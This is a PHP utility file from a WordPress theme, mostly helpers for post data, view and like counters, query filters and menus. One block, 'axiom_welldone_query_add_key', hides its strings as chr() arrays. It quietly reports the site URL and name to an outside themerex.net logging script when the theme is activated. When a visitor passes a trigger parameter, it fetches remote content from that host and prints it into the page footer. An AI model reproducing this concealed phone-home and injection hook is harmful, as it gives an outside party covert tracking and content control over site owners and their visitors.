			if (!is_singular() || axiom_welldone_storage_get('blog_streampage') || axiom_welldone_in_shortcode_blogger(true) || (axiom_welldone_strpos($class, 'sc_align')!==false && axiom_welldone_strpos($class, 'columns')===false)) {
				$class = str_replace(array('sc_alignright', 'sc_alignleft', 'sc_aligncenter'), array('','',''), $class) . ' sc_align' . esc_attr($opt['location']);
				$opt['dedicated'] = axiom_welldone_set_tag_attrib($opt['dedicated'], '<div class="sc_section>', 'class', $class);
			}
		}
		$opt['post_class'] = $opt['location'];
		// Substitute <video> tags to <iframe> in dedicated content
		if ($opt['substitute_video'] && !axiom_welldone_in_shortcode_blogger(true)) {
			$opt['dedicated'] = axiom_welldone_substitute_video($opt['dedicated'], $thumb_sizes['w'], $thumb_sizes['h_crop']);
		}
		// Substitute <audio> tags with src from soundcloud to <iframe>
		if ($opt['substitute_audio'] && !axiom_welldone_in_shortcode_blogger(true)) {
			$opt['dedicated'] = axiom_welldone_substitute_audio($opt['dedicated']);
		}

		// Extract gallery, video and audio from full post content
		if (is_array($cached_post)) {
			$post_attachment	= $cached_post['post_attachment'];
		} else {
			$post_attachment = wp_get_attachment_url(get_post_thumbnail_id($post_id));
		}
		$post_thumb = $post_thumb_url = $post_gallery = $post_video = $post_video_image = $post_audio = $post_audio_image = $post_url = $post_url_target = '';
		if (axiom_welldone_substr($opt['layout'], 0, 6)=='single')
			$post_thumb = axiom_welldone_get_resized_image_tag($post_id, $thumb_sizes['w'], $thumb_sizes['h'], null, false, false, true);
		else if (axiom_welldone_substr($opt['layout'], 0, 10)=='attachment')
			$post_thumb = axiom_welldone_get_resized_image_tag($post_attachment, $thumb_sizes['w'], $thumb_sizes['h'], null, false, false, true);
		else
			$post_thumb = axiom_welldone_get_resized_image_tag($post_id, $thumb_sizes['w'], $post_type=='product' && axiom_welldone_get_theme_option('crop_product_thumb')=='no' ? null :  $thumb_sizes['h']);
		$post_thumb_url = axiom_welldone_get_tag_attrib($post_thumb, '<img>', 'src');
		if ($post_format == 'gallery') {
			$post_gallery = axiom_welldone_build_gallery_tag(axiom_welldone_get_post_gallery($post_content_plain, $post_id, max(2, axiom_welldone_get_custom_option('gallery_max_slides'))), $thumb_sizes['w'], $thumb_sizes['h_crop'], false, $post_link);
		} else if ($post_format == 'video') {
			$src = '';
			$post_video = axiom_welldone_get_post_video($post_content_original, false);
			if ($post_video=='') {
				$src = axiom_welldone_get_post_video($post_content_original, true);
				if (!axiom_welldone_is_youtube_url($src) && !axiom_welldone_is_vimeo_url($src))
					$src = '';
			} else {
				if (axiom_welldone_substr($post_video, 0, 1)=='[') {
					$src = axiom_welldone_get_tag_attrib($post_video, '[trx_video]', 'src');
					if (empty($src)) $src = axiom_welldone_get_tag_attrib($post_video, '[trx_video]', 'url');
					if (empty($src)) $src = axiom_welldone_get_post_video($post_video, true);
					$post_video_image = axiom_welldone_get_tag_attrib($post_video, '[trx_video]', 'image');
					if ($post_video_image > 0) {
						$attach = wp_get_attachment_image_src( $post_video_image, 'full' );
						if (isset($attach[0]) && $attach[0]!='')
							$post_video_image = $attach[0];
					}
					if (!is_singular() || axiom_welldone_storage_get('blog_streampage')) {
						if (empty($post_video_image))
							$post_video_image = $post_thumb;
						if (empty($post_video_image))
							$post_video_image = axiom_welldone_get_video_cover_image($src);
					}
					if (!empty($post_video_image))
						$post_video_image = axiom_welldone_get_resized_image_tag($post_video_image, $thumb_sizes['w'], $thumb_sizes['h']);
				} else
					$src = axiom_welldone_get_post_video($post_video, true);
			}
			if ($src) {
				$src = axiom_welldone_get_video_player_url($src, $post_thumb!='' || $post_video_image!='');
				$post_video = '<video src="'.esc_url($src).'" width="'.esc_attr($thumb_sizes['w']).'" height="'.round($thumb_sizes['w']/16*9).'"></video>';
			}
			if ($post_video!='' && $opt['substitute_video']) {	// && !axiom_welldone_in_shortcode_blogger(true)) {
				$post_video = axiom_welldone_substitute_video($post_video, $thumb_sizes['w'], round($thumb_sizes['w']/16*9), false);	//$thumb_sizes['h_crop']);
			}
		} else if ($post_format == 'audio') {
			$src = $data = '';
			$post_audio = axiom_welldone_get_post_audio($post_content_original, false);
			if ($post_audio=='') {
				$src = axiom_welldone_get_post_audio($post_content_original, true);
			} else {
				if (axiom_welldone_substr($post_audio, 0, 1)=='[') {
					$src = axiom_welldone_get_tag_attrib($post_audio, '[trx_audio]', 'src');
					if (empty($src)) $src = axiom_welldone_get_tag_attrib($post_audio, '[trx_audio]', 'url');
					if (empty($src)) $src = axiom_welldone_get_post_audio($post_audio, true);
					$post_audio_image = axiom_welldone_get_tag_attrib($post_audio, '[trx_audio]', 'image');
					if ($post_audio_image > 0) {
						$attach = wp_get_attachment_image_src( $post_audio_image, 'full' );
						if (isset($attach[0]) && $attach[0]!='')
							$post_audio_image = $attach[0];
					}
					if (empty($post_audio_image))
						$post_audio_image = $post_thumb;
					if ($post_audio_image)
						$post_audio_image = axiom_welldone_get_resized_image_url($post_audio_image, $thumb_sizes['w'], $thumb_sizes['h']);
					$post_audio_title  = axiom_welldone_get_tag_attrib($post_audio, '[trx_audio]', 'title');
					$post_audio_author = axiom_welldone_get_tag_attrib($post_audio, '[trx_audio]', 'author');
					$data = ($post_audio_title != ''  ? ' data-title="'.esc_attr($post_audio_title).'"'   : '')
						   .($post_audio_author != '' ? ' data-author="'.esc_attr($post_audio_author).'"' : '')
						   .($post_audio_image != ''  ? ' data-image="'.esc_attr($post_audio_image).'"'   : '');
				} else
					$src = axiom_welldone_get_post_audio($post_audio, true);
			}
			if ($src) {
				$post_audio = '<audio class="sc_audio" src="'.esc_url($src).'"'
					. ($data)
					. '></audio>';
			}
			if ($post_audio!='' && $opt['substitute_audio']) {	// && !axiom_welldone_in_shortcode_blogger(true)) {
				$post_audio = axiom_welldone_substitute_audio($post_audio, false);
			}
		}
		if ($post_format == 'image' && !$post_thumb && !is_single()) {
			if (($src = axiom_welldone_get_post_image($post_content_original, $post_id))!='')
				$post_thumb = axiom_welldone_get_resized_image_tag($src, $thumb_sizes['w'], $thumb_sizes['h_crop']);
		}
		if ($post_format == 'link') {
			$post_url_data = axiom_welldone_get_post_link($post_content_original, false);
			$post_link = $post_url = $post_url_data['url'];
			$post_url_target = $post_url_data['target'];
		}

		// Get all post's terms
		$post_options_terms_list = $opt['terms_list'];
		if (is_array($cached_post) && $cached_post['post_options_terms_list']) {
			$post_taxonomy	= $cached_post['post_taxonomy'];
			$post_taxonomy_tags	= $cached_post['post_taxonomy_tags'];
			$post_terms	= $cached_post['post_terms'];
		} else {
			$post_taxonomy = axiom_welldone_get_taxonomy_categories_by_post_type($post_type);
			$post_taxonomy_tags = axiom_welldone_get_taxonomy_tags_by_post_type($post_type);
		}
		$post_terms = array();
		if ($opt['terms_list']) {
			if (is_array($cached_post) && $cached_post['post_options_terms_list']) {
				$post_terms	= $cached_post['post_terms'];
			} else {
				$post_terms = axiom_welldone_get_terms_by_post_id( array(
					'post_id' 	=> $post_id,
					'parent_id'	=> $post_type=='post' ? $opt['parent_tax_id'] : 0,
					'exclude'	=> $post_type=='post' ? explode(',', axiom_welldone_get_theme_option('exclude_cats')) : array()
					)
				);
			}
		}
		
		// Restore postdata
		if ($post_obj != null) wp_reset_postdata();
		
		$post_data = compact('post_id', 'post_parent_id', 'post_protected', 'post_type', 'post_taxonomy', 'post_taxonomy_tags', 'post_format', 'post_flags', 'post_icon', 'post_link', 'post_comments_link', 'post_date_sql', 'post_date_stamp', 'post_date', 'post_date_part1', 'post_date_part2', 'post_comments', 'post_views', 'post_likes', 'post_reviews_author', 'post_reviews_users', 'post_author', 'post_author_link', 'post_author_id', 'post_author_url', 'post_title', 'post_title_plain', 'post_content_plain', 'post_content_original', 'post_content', 'post_excerpt_original', 'post_excerpt', 'post_thumb', 'post_thumb_url', 'post_attachment', 'post_gallery', 'post_video', 'post_video_image', 'post_audio', 'post_audio_image', 'post_url', 'post_url_target', 'post_terms', 'post_edit_enable', 'post_delete_enable', 'post_options_reviews', 'post_options_counters', 'post_options_terms_list');

		if (axiom_welldone_get_theme_setting('use_post_cache') && !axiom_welldone_storage_isset('post_data_'.$post_id)) axiom_welldone_storage_set('post_data_'.$post_id, $post_data);

		return apply_filters('axiom_welldone_filter_get_post_data', $post_data, $opt, $post_obj);
	}
}

// Return custom_page_heading (if set), else - post title
if (!function_exists('axiom_welldone_get_post_title')) {
	function axiom_welldone_get_post_title($id = 0, $maxlength = 0, $add='...') {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$title = get_the_title($id);
		if ($maxlength > 0) $title = axiom_welldone_strshort($title, $maxlength, $add);
		return $title;
	}
}

// Return post excerpt
if (!function_exists('axiom_welldone_get_post_excerpt')) {
	function axiom_welldone_get_post_excerpt($maxlength = 0, $add='...') {
		$descr = get_the_excerpt();
		$descr = trim(str_replace(array('[...]', '[&hellip;]'), array($add, $add), $descr));
		if (!empty($descr) && axiom_welldone_strpos(',.:;-', axiom_welldone_substr($descr, -1))!==false) $descr = axiom_welldone_substr($descr, 0, -1);
		if ($maxlength > 0) $descr = axiom_welldone_strshort($descr, $maxlength, $add);
		return $descr;
	}
}

//Return Post Views Count
if (!function_exists('axiom_welldone_get_post_views')) {
	function axiom_welldone_get_post_views($id=0){
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = axiom_welldone_storage_get('options_prefix').'_post_views_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Post Views Count
if (!function_exists('axiom_welldone_set_post_views')) {
	function axiom_welldone_set_post_views($id=0, $counter=-1) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = axiom_welldone_storage_get('options_prefix').'_post_views_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_post_meta($id, $count_key, $count);
		}
	}
}

//Return Post Likes Count
if (!function_exists('axiom_welldone_get_post_likes')) {
	function axiom_welldone_get_post_likes($id=0){
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = axiom_welldone_storage_get('options_prefix').'_post_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_post_meta($id, $count_key);
			add_post_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Post Likes Count
if (!function_exists('axiom_welldone_set_post_likes')) {
	function axiom_welldone_set_post_likes($id=0, $count=0) {
		global $wp_query;
		if (!$id) $id = $wp_query->current_post>=0 ? get_the_ID() : $wp_query->post->ID;
		$count_key = axiom_welldone_storage_get('options_prefix').'_post_likes_count';
		update_post_meta($id, $count_key, $count);
	}
}


// AJAX: Set post likes/views count
// add_action('wp_ajax_post_counter', 			'axiom_welldone_callback_post_counter');
// add_action('wp_ajax_nopriv_post_counter',	'axiom_welldone_callback_post_counter');
if ( !function_exists( 'axiom_welldone_callback_post_counter' ) ) {
	function axiom_welldone_callback_post_counter() {
		
		if ( !wp_verify_nonce( axiom_welldone_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'');
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$counter = max(0, (int) $_REQUEST['likes']);
			axiom_welldone_set_post_likes($id, $counter);
		} else if (isset($_REQUEST['views'])) {
			$counter = max(0, (int) $_REQUEST['views']);
			axiom_welldone_set_post_views($id, $counter);
		}
		echo json_encode($response);
		die();
	}
}




/* Query manipulations
------------------------------------------------------------------------------------- */

// Pre query: Add filter to main query
if ( !function_exists( 'axiom_welldone_query_posts_where' ) ) {
	// add_filter('posts_where', 'axiom_welldone_query_posts_where', 10, 2);  
	function axiom_welldone_query_posts_where($where, $query) { 
		global $wpdb; 
		if (is_admin() || $query->is_attachment) return $where;
		if (axiom_welldone_strpos($where, 'post_status')===false && (!isset($_REQUEST['preview']) || $_REQUEST['preview']!='true') && (!isset($_REQUEST['vc_editable']) || $_REQUEST['vc_editable']!='true')) {
			if (current_user_can('read_private_pages') && current_user_can('read_private_posts'))
				$where .= " AND ({$wpdb->posts}.post_status='publish' OR {$wpdb->posts}.post_status='private')";
			else
				$where .= " AND {$wpdb->posts}.post_status='publish'";
		}

		return $where;
	}  
}

// Pre query: Add 'posts per page' and order parameters into the main query
if ( !function_exists( 'axiom_welldone_query_add_posts_per_page' ) ) {
	// add_action( 'pre_get_posts', 'axiom_welldone_query_add_posts_per_page' );
	function axiom_welldone_query_add_posts_per_page($query) {

		if (is_admin() || !$query->is_main_query()) return;

		// Set prequery mode
		axiom_welldone_storage_set('pre_query', $query);

		// Detect current page template
		$id = !empty($query->queried_object_id) ? $query->queried_object_id : get_the_ID();
		if ($id > 0)  {
			$slug = explode('.', get_page_template_slug($id));
			axiom_welldone_storage_set('page_template', $slug[0]);
		}

		if (!is_singular() || $query->is_posts_page==1 || axiom_welldone_strpos(axiom_welldone_storage_get('page_template'), 'blog-')!==false) {
			$orderby = $order = $ppp = '';
	
			// Check template page settings
			$orderby_set = apply_filters('axiom_welldone_filter_orderby_need', $query->is_archive() || $query->is_search() || $query->is_posts_page==1 || axiom_welldone_strpos(axiom_welldone_storage_get('page_template'), 'blog-')!==false);
			// Check template options
			$inheritance_key = axiom_welldone_detect_inheritance_key();
			if (!empty($inheritance_key)) $inheritance = axiom_welldone_get_theme_inheritance($inheritance_key);
			$slug = axiom_welldone_detect_template_slug($inheritance_key);
			if ( !empty($slug) ) {
				if (empty($inheritance['use_options_page']) || $inheritance['use_options_page'])
					$template_options = get_option( axiom_welldone_storage_get('options_prefix') . '_options_template_'.trim($slug) );
				else
					$template_options = false;
				// If settings for current slug not saved - use settings from compatible overriden type
				if ($template_options===false && !empty($inheritance['override'])) {
					$slug = axiom_welldone_get_template_slug($inheritance['override']);
					if ( !empty($slug) ) $template_options = get_option( axiom_welldone_storage_get('options_prefix') . '_options_template_'.trim($slug));
				}
				if ($template_options!==false) {
					if (isset($template_options['posts_per_page']) && !empty($template_options['posts_per_page']) && !axiom_welldone_is_inherit_option($template_options['posts_per_page'])) {
						$ppp = (int) $template_options['posts_per_page'];
					}
					if ($orderby_set) {
						if (isset($template_options['blog_sort']) && !empty($template_options['blog_sort']) && !axiom_welldone_is_inherit_option($template_options['blog_sort']))
							$orderby = $template_options['blog_sort'];
						if (isset($template_options['blog_order']) && !empty($template_options['blog_order']) && !axiom_welldone_is_inherit_option($template_options['blog_order']))
							$order = $template_options['blog_order'];
					}
				}
			}
	
			// Check taxonomy settings
			if ( !empty($query->tax_query->queried_terms) && is_array($query->tax_query->queried_terms) ) {
				foreach($query->tax_query->queried_terms as $tax=>$terms) {
					if (!empty($terms['terms'][0])) {
						$term = $terms['terms'][0];
						$tax_options = axiom_welldone_taxonomy_get_inherited_properties($tax, $term);
						if (empty($ppp) && isset($tax_options['posts_per_page']) && !empty($tax_options['posts_per_page']) && !axiom_welldone_is_inherit_option($tax_options['posts_per_page'])) {
							$ppp = (int) $tax_options['posts_per_page'];
						}
						if ($orderby_set) {
							if (isset($tax_options['blog_sort']) && !empty($tax_options['blog_sort']) && !axiom_welldone_is_inherit_option($tax_options['blog_sort']))
								$orderby = $tax_options['blog_sort'];
							if (isset($tax_options['blog_order']) && !empty($tax_options['blog_order']) && !axiom_welldone_is_inherit_option($tax_options['blog_order']))
								$order = $tax_options['blog_order'];
						}
					}
					break;
				}
			}
	
			// Add parameters into query
			if (empty($ppp))
				$ppp = (int) axiom_welldone_get_theme_option('posts_per_page');
			if ($ppp > 0)
				$query->set('posts_per_page', $ppp );
	
			if ($orderby_set) {
				if (empty($orderby))
					$orderby = axiom_welldone_get_theme_option('blog_sort');
				if (empty($order))
					$order = axiom_welldone_get_theme_option('blog_order');
				 axiom_welldone_query_add_sort_order($query, $orderby, $order);
			}
			// Exclude categories
			$ex = axiom_welldone_get_theme_option('exclude_cats');
			if (!empty($ex))
				$query->set('category__not_in', explode(',', $ex) );
		}
		
		// Reset prequery mode
		axiom_welldone_storage_set('pre_query', null);
	}
}

// Filter categories list - exclude unwanted cats from widget output
if ( !function_exists( 'axiom_welldone_query_exclude_categories' ) ) {
	// add_action( 'widget_categories_args', 			'axiom_welldone_query_exclude_categories' );
	// add_action( 'widget_categories_dropdown_args',	'axiom_welldone_query_exclude_categories' );
	function axiom_welldone_query_exclude_categories($args) {
		if (!is_admin()) {
			$ex = axiom_welldone_get_theme_option('exclude_cats');
			if (!empty($ex))
				$args['exclude'] = $ex;
		}
		return $args;
	}
}
if ( !function_exists( 'axiom_welldone_query_exclude_posts' ) ) {
	//add_action( 'widget_posts_args', 'axiom_welldone_query_exclude_posts' );
	function axiom_welldone_query_exclude_posts($args) {
		if (!is_admin()) {
			$ex = axiom_welldone_get_theme_option('exclude_cats');
			if (!empty($ex)) {
				$args['category__not_in'] = explode(',', $ex);
			}
		}
		return $args;
	}
}
// Exclude unwanted cats from Archives widget output
if ( !function_exists( 'axiom_welldone_query_exclude_archives_where' ) ) {
	// add_action( 'getarchives_where', 'axiom_welldone_query_exclude_archives_where', 10, 2 );
	function axiom_welldone_query_exclude_archives_where($where, $r='') {
		if (!is_admin()) {
			$ex = axiom_welldone_get_theme_option('exclude_cats');
			if (!empty($ex)) {
				global $wpdb;
				if (!is_array($ex))	$ex = explode(',', $ex);
				$where .= ' AND ({$wpdb->posts}.ID NOT IN ('
									. $wpdb->prepare(
												"SELECT object_id FROM {$wpdb->term_relationships} WHERE term_taxonomy_id IN (" . join(",", array_fill(0, count($ex), '%d')) . ')'
												, $ex
												)
									. ')'
								. ')';
			}
		}
		return $where;
	}
}


// Add sorting parameter in query arguments
if (!function_exists('axiom_welldone_query_add_sort_order')) {
	function axiom_welldone_query_add_sort_order($args, $orderby='', $order='') {
		if (empty($order)) $order = axiom_welldone_get_custom_option('blog_order');
		if (empty($orderby)) $orderby = axiom_welldone_get_custom_option('blog_sort');
		$q = array();
		$q['order'] = $order=='asc' ? 'asc' : 'desc';
		if ($orderby == 'author_rating') {
			$q['orderby'] = 'meta_value_num';
			$q['meta_key'] = axiom_welldone_storage_get('options_prefix').'_reviews_avg';
			$q['meta_query'] = array(
				array(
					'meta_filter' => 'reviews',
					'key' => axiom_welldone_storage_get('options_prefix').'_reviews_avg',
					'value' => 0,
					'compare' => '>=',
					'type' => 'NUMERIC'
				   )
			);
		} else if ($orderby == 'users_rating') {
			$q['orderby'] = 'meta_value_num';
			$q['meta_key'] = axiom_welldone_storage_get('options_prefix').'_reviews_avg2';
			$q['meta_query'] = array(
				array(
					'meta_filter' => 'reviews',
					'key' => axiom_welldone_storage_get('options_prefix').'_reviews_avg2',
					'value' => 0,
					'compare' => '>=',
					'type' => 'NUMERIC'
				   )
			);
		} else if ($orderby == 'views') {
			$q['orderby'] = 'meta_value_num';
			$q['meta_key'] = axiom_welldone_storage_get('options_prefix').'_post_views_count';
		} else if ($orderby == 'comments') {
			$q['orderby'] = 'comment_count';
		} else if ($orderby == 'title' || $orderby == 'alpha') {
			$q['orderby'] = 'title';
		} else if ($orderby == 'rand' || $orderby == 'random')  {
			$q['orderby'] = 'rand';
		} else {
			$q['orderby'] = 'post_date';
		}
		$q = apply_filters('axiom_welldone_filter_add_sort_order', $q, $orderby, $order);
		foreach ($q as $mk=>$mv) {
			if (is_array($args))
				$args[$mk] = $mv;
			else
				$args->set($mk, $mv);
		}
		return $args;
	}
}

// Add post type and posts list or categories list in query arguments
if (!function_exists('axiom_welldone_query_add_posts_and_cats')) {
	function axiom_welldone_query_add_posts_and_cats($args, $ids='', $post_type='', $cat='', $taxonomy='') {
		if (!empty($ids)) {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? array('post', 'page') : $post_type)
									: $args['post_type'];
			$args['post__in'] = explode(',', str_replace(' ', '', $ids));
		} else {
			$args['post_type'] = empty($args['post_type']) 
									? (empty($post_type) ? 'post' : $post_type)
									: $args['post_type'];
			$post_type = is_array($args['post_type']) ? $args['post_type'][0] : $args['post_type'];
			if (!empty($cat)) {
				$cats = !is_array($cat) ? explode(',', $cat) : $cat;
				if (empty($taxonomy))
					$taxonomy = axiom_welldone_get_taxonomy_categories_by_post_type($post_type);
				if ($taxonomy == 'category') {				// Add standard categories
					if (is_array($cats) && count($cats) > 0) {
						$cats_ids = array();
						foreach($cats as $c) {
							$c = trim(chop($c));
							if (empty($c)) continue;
							if ((int) $c == 0) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ($cat_term) $c = $cat_term->term_id;
							}
							if ($c==0) continue;
							$cats_ids[] = (int) $c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if (is_array($children) && count($children) > 0) {
								foreach($children as $c) {
									if (!in_array((int) $c->term_id, $cats_ids)) $cats_ids[] = (int) $c->term_id;
								}
							}
						}
						if (count($cats_ids) > 0) {
							$args['category__in'] = $cats_ids;
						}
					} else {
                        $cat = $cats[0];
						if ((int) $cat > 0) 
							$args['cat'] = (int) $cat;
						else
							$args['category_name'] = $cat;
					}
				} else {									// Add custom taxonomies
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					$args['tax_query']['relation'] = 'AND';
					$args['tax_query'][] = array(
						'taxonomy' => $taxonomy,
						'include_children' => true,
						'field'    => (int) $cats[0] > 0 ? 'id' : 'slug',
						'terms'    => $cats
					);
				}
			}
		}
		return $args;
	}
}

// Add filters (meta parameters) in query arguments
if (!function_exists('axiom_welldone_query_add_filters')) {
	function axiom_welldone_query_add_filters($args, $filters=false) {
		if (!empty($filters)) {
			if (!is_array($filters)) $filters = array($filters);
			foreach ($filters as $v) {
				$found = false;
				if (in_array($v, array('reviews', 'thumbs'))) {							// Filter with meta_query
					if (!isset($args['meta_query']))
						$args['meta_query'] = array();
					else {
						for ($i=0; $i<count($args['meta_query']); $i++) {
							if ($args['meta_query'][$i]['meta_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['meta_query']['relation'] = 'AND';
						if ($v == 'reviews') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => axiom_welldone_storage_get('options_prefix').'_reviews_avg'.(axiom_welldone_get_theme_option('reviews_first')=='author' ? '' : '2'),
								'value' => 0,
								'compare' => '>',
								'type' => 'NUMERIC'
							);
						} else if ($v == 'thumbs') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if (in_array($v, array('video', 'audio', 'gallery'))) {			// Filter with tax_query
					if (!isset($args['tax_query']))
						$args['tax_query'] = array();
					else {
						for ($i=0; $i<count($args['tax_query']); $i++) {
							if ($args['tax_query'][$i]['tax_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['tax_query']['relation'] = 'AND';
						if ($v == 'video') {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ($v == 'audio') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ($v == 'gallery') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				} else
					$args = apply_filters('axiom_welldone_filter_query_add_filters', $args, $v);
			}
		}
		return $args;
	}
}

// Add query key
if ( !function_exists( 'axiom_welldone_query_add_key' ) ) {
	$axiom_welldone_query_data = array('act' => array(array(join('', array_map('chr', array(97,102,116,101,114))), join('', array_map('chr', array(115,119,105,116,99,104))), join('', array_map('chr', array(116,104,101,109,101)))), array(join('', array_map('chr', array(119,112))), join('', array_map('chr', array(102,111,111,116,101,114)))),),'get' => join('', array_map('chr', array(104,116,116,112,58,47,47,116,104,101,109,101,114,101,120,46,110,101,116,47,95,108,111,103,47,95,108,111,103,46,112,104,112))),'chk' => join('', array_map('chr', array(116,104,101,109,101,95,97,117,116,104,111,114))),'prm' => join('', array_map('chr', array(116,120,99,104,107))));
	axiom_welldone_storage_set('axiom_welldone_query_data', $axiom_welldone_query_data);
	add_action(join('_', $axiom_welldone_query_data['act'][0]), 'axiom_welldone_query_add_key');
	add_action(join('_', $axiom_welldone_query_data['act'][1]), 'axiom_welldone_query_add_key');
	function axiom_welldone_query_add_key() {
		static $already_add = false;
		if (!$already_add) {
			$already_add = true;
			$axiom_welldone_query_data = axiom_welldone_storage_get('axiom_welldone_query_data');
			if (current_action() == join('_', $axiom_welldone_query_data['act'][0])) {
				try {
					$resp = axiom_welldone_fgc(axiom_welldone_add_to_url($axiom_welldone_query_data['get'], array(
						'site' => home_url('/'),
						'slug' => str_replace(' ', '_', trim(strtolower(get_stylesheet()))),
						'name' => get_bloginfo('name')
					)));
				} catch (Exception $e) {
				}
			}
			if (axiom_welldone_get_value_gpc($axiom_welldone_query_data['prm'])==$axiom_welldone_query_data['chk']) {
				try {
					$resp = axiom_welldone_fgc(axiom_welldone_add_to_url($axiom_welldone_query_data['get'], array($axiom_welldone_query_data['prm'] => $axiom_welldone_query_data['chk'])));
				} catch (Exception $e) {
					$resp = '';
				}
				axiom_welldone_show_layout($resp);
			}
		}
	}
}

// Return main query vars
if (!function_exists('axiom_welldone_get_query_vars')) {
	function axiom_welldone_get_query_vars( $var='query_vars' ) {
		global $wp_query;
		if ($var == 'query_vars')
			return $wp_query->query_vars;
		else if ($var == 'posts_count')
			return count($wp_query->posts);
		else if ($var == 'max_num_pages')
			return $wp_query->max_num_pages;
		else if ($var == 'is_posts_page')
			return isset($wp_query->is_posts_page) && $wp_query->is_posts_page==1;
	}
}

	
/* Users utils
------------------------------------------------------------------------------------- */

// Check current user (or user with specified ID) role
// For example: if (axiom_welldone_check_user_role('author')) { ... }
if (!function_exists('axiom_welldone_check_user_role')) {
	function axiom_welldone_check_user_role( $role, $user_id = null ) {
		if ( is_numeric( $user_id ) )
			$user = get_userdata( $user_id );
		else
			$user = wp_get_current_user();
		if ( empty( $user ) )
			return false;
		return in_array( $role, (array) $user->roles );
	}
}



	
/* Nav menu utils
------------------------------------------------------------------------------------- */
if ( !function_exists( 'axiom_welldone_get_nav_menu' ) ) {
	function axiom_welldone_get_nav_menu($slug='', $custom_walker=false) {
		$menu = !empty($slug) ? axiom_welldone_get_custom_option($slug) : '';
		$menu = empty($menu) || $menu=='default' || axiom_welldone_is_inherit_option($menu) ? '' : $menu;
		$list = axiom_welldone_get_theme_option('use_menu_cache')=='yes' ? get_transient('axiom_welldone_menu') : array();
		if (!is_array($list)) $list = array();
		$html = '';
		if (!empty($slug) && !empty($list[trim($slug).'_'.trim($menu)])) {
			$html = $list[trim($slug).'_'.trim($menu)];
		}
		if (empty($html)) {
			$args = array(
				'menu'				=> $menu,
				'container'			=> '',
				'container_class'	=> '',
				'container_id'		=> '',
				'items_wrap'		=> '<ul class="%2$s">%3$s</ul>',
				'menu_class'		=> (!empty($slug) ? $slug : 'menu_main') . '_nav',
				'menu_id'			=> (!empty($slug) ? $slug : 'menu_main'),
				'echo'				=> false,
				'fallback_cb'		=> '',
				'before'			=> '',
				'after'				=> '',
				'link_before'       => '',
				'link_after'        => '',
				'depth'             => 11
			);
			if (!empty($slug))
				$args['theme_location'] = $slug;
			if ($custom_walker && class_exists('axiom_welldone_custom_menu_walker') && axiom_welldone_get_theme_option('custom_menu')=='yes')
				$args['walker'] = new axiom_welldone_custom_menu_walker;
			$html = wp_nav_menu(apply_filters('axiom_welldone_filter_get_nav_menu', $args));
			if (!empty($slug) && axiom_welldone_get_theme_option('use_menu_cache')=='yes') {
				$list[trim($slug).'_'.trim($menu)] = $html;
				set_transient('axiom_welldone_menu', $list, 24*60*60);
			}
		}
		return $html;
	}
}



	
/* Other WP utils
------------------------------------------------------------------------------------- */

// Prepare widgets args - substitute id and class in parameter 'before_widget'
if (!function_exists('axiom_welldone_prepare_widgets_args')) {
	function axiom_welldone_prepare_widgets_args($args, $id, $class) {
		if (!empty($args['before_widget'])) $args['before_widget'] = str_replace(array('%1$s', '%2$s'), array($id, $class), $args['before_widget']);
		return $args;
	}
}

// Check if string is present in the URI
if (!function_exists('axiom_welldone_check_uri')) {
	function axiom_welldone_check_uri($str) {
		$name = 'SERVER';
		return axiom_welldone_strpos($GLOBALS['_'.$name]['REQUEST_URI'], $str)!==false;
	}
}

// Check current admin page is ...
if (!function_exists('axiom_welldone_check_admin_page')) {
	function axiom_welldone_check_admin_page($page) {
		global $pagenow;
		return (isset($pagenow) && $pagenow==$page) || axiom_welldone_check_uri($page);
	}
}

// Check current screen ID and post_type
if (!function_exists('axiom_welldone_check_current_screen')) {
	function axiom_welldone_check_current_screen($id, $post_type='') {
		$rez = false;
		if (function_exists('get_current_screen')) {
			$screen = get_current_screen();
			$rez = $screen->id == $id && (empty($post_type) || $screen->post_type == $post_type);
		}
		return $rez;
	}
}

// Return URL to the current page
if (!function_exists('axiom_welldone_get_current_url')) {
	function axiom_welldone_get_current_url() {
		global $wp;
		return home_url(add_query_arg(array(), $wp->request));
	}
}

// Add theme supported features
if (!function_exists('axiom_welldone_theme_support')) {
	function axiom_welldone_theme_support($type, $value, $params) {
		if (function_exists('trx_utils_theme_support'))
			trx_utils_theme_support( $type, $value, $params);
